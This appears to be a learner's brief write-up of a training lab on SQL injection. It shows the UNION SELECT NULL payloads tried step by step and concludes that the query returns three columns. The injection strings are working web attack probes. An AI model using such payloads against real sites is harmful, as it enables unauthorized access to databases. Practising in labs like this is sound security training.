SQL injection UNION attack, determining the number of columns returned by the query \
Goal - To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. \
Step 1 \
   tried \
     ' UNION SELECT NULL -- \
     <img width="1602" height="905" alt="image" src="https://github.com/user-attachments/assets/93187b23-987c-43e9-b82d-6a680f44fa03" /> \
     Got error,,meaning its more than one column. \
Step 2  \ 
    tried \
     ' UNION SELECT NULL,NULL -- \
     <img width="1599" height="906" alt="image" src="https://github.com/user-attachments/assets/423d2db4-9ba4-4f93-bba8-fcac04013d6c" /> \
     Got error,,meaning its 2+ columns \
Step 3 \
      tried \
       ' UNION SELECT NULL,NULL,NULL -- \
       <img width="1600" height="914" alt="image" src="https://github.com/user-attachments/assets/97fa11b5-a3c9-45e9-b99a-9984db65c6e0" /> \
       Worked \
       Conclusion - 3 columns \
       Pretty Simple \
       <img width="1919" height="901" alt="image" src="https://github.com/user-attachments/assets/b13500fe-5945-4b89-880d-62c17090ffbf" />

       
       

